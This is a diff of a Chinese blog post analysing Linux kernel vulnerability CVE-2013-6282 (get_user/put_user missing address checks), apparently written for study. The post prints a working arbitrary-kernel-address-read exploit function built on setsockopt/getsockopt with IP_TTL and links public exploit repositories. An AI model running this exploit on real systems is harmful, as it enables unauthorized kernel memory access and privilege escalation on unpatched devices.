@@ -7,20 +7,20 @@
   
   
   
-  <title>cve_2013_6282_analysis | Hexo</title>
+  <title>CVE-2013-6282-analysis | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="CVE-2013-6282分析(相关系统调用查询)">
+  <meta name="description" content="本文摘要—— CVE-2013-6282-analysis">
 <meta name="keywords" content="linux,kernel,cve-2013-6282">
 <meta property="og:type" content="article">
-<meta property="og:title" content="cve_2013_6282_analysis">
-<meta property="og:url" content="http://yoursite.com/posts/uncategorized/2018-05-02-cve_2013_6282_analysis.html">
+<meta property="og:title" content="CVE-2013-6282-analysis">
+<meta property="og:url" content="http://yoursite.com/posts/kernel/2018-05-02-cve_2013_6282_analysis.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="CVE-2013-6282分析(相关系统调用查询)">
+<meta property="og:description" content="本文摘要—— CVE-2013-6282-analysis">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-05-02T14:29:33.000Z">
+<meta property="og:updated_time" content="2018-05-02T15:39:39.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="cve_2013_6282_analysis">
-<meta name="twitter:description" content="CVE-2013-6282分析(相关系统调用查询)">
+<meta name="twitter:title" content="CVE-2013-6282-analysis">
+<meta name="twitter:description" content="本文摘要—— CVE-2013-6282-analysis">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -228,8 +228,8 @@
       <div class="body-wrap"><article id="post-cve_2013_6282_analysis" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/posts/uncategorized/2018-05-02-cve_2013_6282_analysis.html" class="article-date">
-      <time datetime="2018-05-02T14:29:33.000Z" itemprop="datePublished">2018-05-02</time>
+      <a  href="/posts/kernel/2018-05-02-cve_2013_6282_analysis.html" class="article-date">
+      <time datetime="2018-05-02T15:39:39.000Z" itemprop="datePublished">2018-05-02</time>
 </a>
 
     </div>
@@ -243,7 +243,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      cve_2013_6282_analysis
+      CVE-2013-6282-analysis
     </h1>
   
 
@@ -252,6 +252,10 @@
       
       <div class="article-info article-info-post">
         
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/kernel/">kernel</a>
+    </div>
+
 
         
     <div class="article-tag tagcloud">
@@ -265,8 +269,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="CVE-2013-6282分析-相关系统调用查询"><a href="#CVE-2013-6282分析-相关系统调用查询" class="headerlink" title="CVE-2013-6282分析(相关系统调用查询)"></a>CVE-2013-6282分析(<a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">相关系统调用查询</a>)</h2><a id="more"></a>
-<h3 id="用户空间和内核空间传递数据"><a href="#用户空间和内核空间传递数据" class="headerlink" title="用户空间和内核空间传递数据"></a>用户空间和内核空间传递数据</h3><p>用户空间和内核空间传递数据一般是通过copy_to_user/copy_from_user或者put_user/get_user</p>
+        <h1 id="本文摘要——"><a href="#本文摘要——" class="headerlink" title=" 本文摘要——   "></a><strong> 本文摘要—— CVE-2013-6282-analysis </strong> <excerpt in="" index="" |="" 首页:摘要=""></excerpt></h1><a id="more"></a>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+<h2 id="CVE-2013-6282分析-相关系统调用查询"><a href="#CVE-2013-6282分析-相关系统调用查询" class="headerlink" title="CVE-2013-6282分析(相关系统调用查询)"></a>CVE-2013-6282分析(<a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">相关系统调用查询</a>)</h2><h3 id="用户空间和内核空间传递数据"><a href="#用户空间和内核空间传递数据" class="headerlink" title="用户空间和内核空间传递数据"></a>用户空间和内核空间传递数据</h3><p>用户空间和内核空间传递数据一般是通过copy_to_user/copy_from_user或者put_user/get_user</p>
 <h4 id="put-user-linux-include-asm-i386-uaccess-h"><a href="#put-user-linux-include-asm-i386-uaccess-h" class="headerlink" title="put_user(linux/include/asm-i386/uaccess.h)"></a>put_user(linux/include/asm-i386/uaccess.h)</h4><p>put_user向用户空间ptr写入一个简单的值x</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">put_user(x,ptr)</span><br><span class="line">ptr——用户空间的目的地址</span><br><span class="line">x——写入用户空间的值</span><br><span class="line">返回<span class="number">0</span>表示成功,-EFAULT表示失败</span><br></pre></td></tr></table></figure>
 <h4 id="get-user"><a href="#get-user" class="headerlink" title="get_user"></a>get_user</h4><p>get_user从用户空间获取一个简单的变量</p>
@@ -301,7 +307,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/socket.h#L275</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOL_IP		0</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/socket.h#L299</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOL_TIPC	271</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/in.h#L30</span></span><br><span class="line">IPPROTO_TCP = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/in.h#L30</span></span><br><span class="line">#define IP_TTL		<span class="number">2</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L202</span></span><br><span class="line">#define TIPC_IMPORTANCE		<span class="number">127</span>	<span class="comment">/* Default: TIPC_LOW_IMPORTANCE */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L203</span></span><br><span class="line">#define TIPC_SRC_DROPPABLE	<span class="number">128</span>	<span class="comment">/* Default: based on socket type */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L204</span></span><br><span class="line">#define TIPC_DEST_DROPPABLE	<span class="number">129</span>	<span class="comment">/* Default: based on socket type */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L205</span></span><br><span class="line">#define TIPC_CONN_TIMEOUT	<span class="number">130</span>	<span class="comment">/* Default: 8000 (ms)  */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L206</span></span><br><span class="line">#define TIPC_NODE_RECVQ_DEPTH	<span class="number">131</span>	<span class="comment">/* Default: none (read only) */</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L207</span></span><br><span class="line">#define TIPC_SOCK_RECVQ_DEPTH	<span class="number">132</span>	<span class="comment">/* Default: none (read only) */</span></span><br></pre></td></tr></table></figure>
 <h4 id="任意地址读exp"><a href="#任意地址读exp" class="headerlink" title="任意地址读exp"></a><a href="https://github.com/fi01/libget_user_exploit/blob/master/get_user.c" target="_blank" rel="noopener">任意地址读exp</a></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">static <span class="keyword">bool</span> ipsock_read_value_at_address(unsigned long address, <span class="keyword">int</span> *value)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="keyword">int</span> addr;</span><br><span class="line">  unsigned char *data = (void *)value;</span><br><span class="line">  <span class="keyword">int</span> sock;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  *value = <span class="number">0</span>;</span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//建立套接字</span></span><br><span class="line">  <span class="keyword">if</span> ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    printf(<span class="string">"error in socket().\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sizeof (*value); i++, address++, data++) &#123;</span><br><span class="line">  	<span class="comment">//布置合理的lv绕过check,通过get_user读取address地址的内容实现任意地址读</span></span><br><span class="line">  	<span class="comment">//返回0读取成功</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sock, SOL_IP, IP_TTL, (void *)address, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//get_user返回-EFAULT 失败</span></span><br><span class="line">    	<span class="keyword">if</span> (errno != EINVAL) &#123;</span><br><span class="line">      	    printf(<span class="string">"error in setsockopt().\n"</span>);</span><br><span class="line">		    *value = <span class="number">0</span>;</span><br><span class="line">		    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//get_user返回0 说明get_user成功执行</span></span><br><span class="line">      socklen_t optlen = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (getsockopt(sock, SOL_IP, IP_TTL, data, &amp;optlen) != <span class="number">0</span>) &#123;</span><br><span class="line">      	printf(<span class="string">"error in getsockopt().\n"</span>);</span><br><span class="line">		*value = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">close</span>(sock);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/timwr/CVE-2013-6282/blob/master/exploit.c" target="_blank" rel="noopener">https://github.com/timwr/CVE-2013-6282/blob/master/exploit.c</a><br><a href="https://github.com/fi01/libput_user_exploit/blob/master/put_user.c" target="_blank" rel="noopener">https://github.com/fi01/libput_user_exploit/blob/master/put_user.c</a><br><a href="https://github.com/fi01/libget_user_exploit/blob/master/get_user.c" target="_blank" rel="noopener">https://github.com/fi01/libget_user_exploit/blob/master/get_user.c</a><br><a href="https://github.com/fi01/libget_user_exploit/blob/master/get_user.c" target="_blank" rel="noopener">https://github.com/fi01/libget_user_exploit/blob/master/get_user.c</a><br><a href="https://github.com/erik96/Linux-Kernel-3.4/blob/linux-stable2/net/tipc/socket.c" target="_blank" rel="noopener">https://github.com/erik96/Linux-Kernel-3.4/blob/linux-stable2/net/tipc/socket.c</a><br><a href="https://github.com/erik96/Linux-Kernel-3.4/" target="_blank" rel="noopener">https://github.com/erik96/Linux-Kernel-3.4/</a></p>
-
+</the>
       
     </div>
     
@@ -309,13 +315,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/posts/uncategorized/2018-05-02-cve_2013_6282_analysis.html">cve_2013_6282_analysis</a></p>
+        <p><span>本文标题:</span><a  href="/posts/kernel/2018-05-02-cve_2013_6282_analysis.html">CVE-2013-6282-analysis</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 0x9k 的个人博客">0x9k</a></p>
-        <p><span>发布时间:</span>2018年05月02日 - 22时29分</p>
-        <p><span>最后更新:</span>2018年05月02日 - 22时29分</p>
+        <p><span>发布时间:</span>2018年05月02日 - 23时39分</p>
+        <p><span>最后更新:</span>2018年05月02日 - 23时39分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/posts/uncategorized/2018-05-02-cve_2013_6282_analysis.html" title="cve_2013_6282_analysis">http://yoursite.com/posts/uncategorized/2018-05-02-cve_2013_6282_analysis.html</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/posts/uncategorized/2018-05-02-cve_2013_6282_analysis.html　　作者: 0x9k" title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/posts/kernel/2018-05-02-cve_2013_6282_analysis.html" title="CVE-2013-6282-analysis">http://yoursite.com/posts/kernel/2018-05-02-cve_2013_6282_analysis.html</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/posts/kernel/2018-05-02-cve_2013_6282_analysis.html　　作者: 0x9k" title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -327,8 +333,8 @@
 <nav id="article-nav">
   
   
-    <a  href="/posts/uncategorized/2018-05-02-new_reliable_android_kernel_root_exploit.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">new_reliable_android_kernel_root_exploit</div>
+    <a  href="/posts/uncategorized/2018-05-02-syzkaller_source_read_target_type_and_function.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">syzkaller_source_read_target_type_and_function</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -340,7 +346,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2013-6282分析-相关系统调用查询"><span class="toc-number">1.</span> <span class="toc-text">CVE-2013-6282分析(相关系统调用查询)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#用户空间和内核空间传递数据"><span class="toc-number">1.1.</span> <span class="toc-text">用户空间和内核空间传递数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#put-user-linux-include-asm-i386-uaccess-h"><span class="toc-number">1.1.1.</span> <span class="toc-text">put_user(linux/include/asm-i386/uaccess.h)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-user"><span class="toc-number">1.1.2.</span> <span class="toc-text">get_user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#copy-to-user"><span class="toc-number">1.1.3.</span> <span class="toc-text">copy_to_user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#copy-from-user"><span class="toc-number">1.1.4.</span> <span class="toc-text">copy_from_user</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过put-user达到任意地址写-也可以通过ptrace调用put-user实现任意地址写"><span class="toc-number">1.2.1.</span> <span class="toc-text">通过put_user达到任意地址写(也可以通过ptrace调用put_user实现任意地址写)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#任意地址写exp"><span class="toc-number">1.2.2.</span> <span class="toc-text">任意地址写exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#任意地址写的利用思路"><span class="toc-number">1.2.3.</span> <span class="toc-text">任意地址写的利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ptmx-fops定义"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">ptmx_fops定义</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过get-user实现任意地址读"><span class="toc-number">1.2.4.</span> <span class="toc-text">通过get_user实现任意地址读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#任意地址读exp"><span class="toc-number">1.2.5.</span> <span class="toc-text">任意地址读exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#本文摘要——"><span class="toc-number">1.</span> <span class="toc-text"> 本文摘要—— CVE-2013-6282-analysis  </span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2013-6282分析-相关系统调用查询"><span class="toc-number">1.1.</span> <span class="toc-text">CVE-2013-6282分析(相关系统调用查询)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#用户空间和内核空间传递数据"><span class="toc-number">1.1.1.</span> <span class="toc-text">用户空间和内核空间传递数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#put-user-linux-include-asm-i386-uaccess-h"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">put_user(linux/include/asm-i386/uaccess.h)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-user"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">get_user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#copy-to-user"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">copy_to_user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#copy-from-user"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">copy_from_user</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因"><span class="toc-number">1.1.2.</span> <span class="toc-text">漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过put-user达到任意地址写-也可以通过ptrace调用put-user实现任意地址写"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">通过put_user达到任意地址写(也可以通过ptrace调用put_user实现任意地址写)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#任意地址写exp"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">任意地址写exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#任意地址写的利用思路"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">任意地址写的利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ptmx-fops定义"><span class="toc-number">1.1.2.3.1.</span> <span class="toc-text">ptmx_fops定义</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过get-user实现任意地址读"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">通过get_user实现任意地址读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#任意地址读exp"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">任意地址读exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">1.1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -380,17 +386,20 @@
 
 
 
-
-<div class="bdsharebuttonbox">
-	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
-	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
-	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
-	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
-	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
-	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
-	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+<div class="share">
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+    <a href="#" class="bds_copy" data-cmd="copy" title="复制网址"></a>
+    <a href="#" class="bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+    </div>
+    <script>
+        window._bd_share_config={
+            "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+    </script>
 </div>
-<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
 
 
 
@@ -442,12 +451,12 @@
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/posts/uncategorized/2018-05-02-new_reliable_android_kernel_root_exploit.html" title="下一篇: new_reliable_android_kernel_root_exploit">
+            <a  href="/posts/uncategorized/2018-05-02-syzkaller_source_read_target_type_and_function.html" title="下一篇: syzkaller_source_read_target_type_and_function">
                 <i class="fa fa-angle-right"></i>
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-cve_2013_6282_analysis.html">cve_2013_6282_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-new_reliable_android_kernel_root_exploit.html">new_reliable_android_kernel_root_exploit</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-syzkaller_source_read_rand_type_and_function.html">syzkaller_source_read_rand_type_and_function</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-syzkaller_source_read_syscall_type_and_function.html">syzkaller_source_read_syscall_type_and_function</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-syzkaller_source_read_target_type_and_function.html">syzkaller_source_read_target_type_and_function</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/posts/kernel/2018-05-02-cve_2013_6282_analysis.html">CVE-2013-6282-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-syzkaller_source_read_target_type_and_function.html">syzkaller_source_read_target_type_and_function</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-syzkaller_source_read_syscall_type_and_function.html">syzkaller_source_read_syscall_type_and_function</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-syzkaller_source_read_rand_type_and_function.html">syzkaller_source_read_rand_type_and_function</a></li><li class="post-list-item"><a class="post-list-link" href="/posts/uncategorized/2018-05-02-new_reliable_android_kernel_root_exploit.html">new_reliable_android_kernel_root_exploit</a></li></ul>
     
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
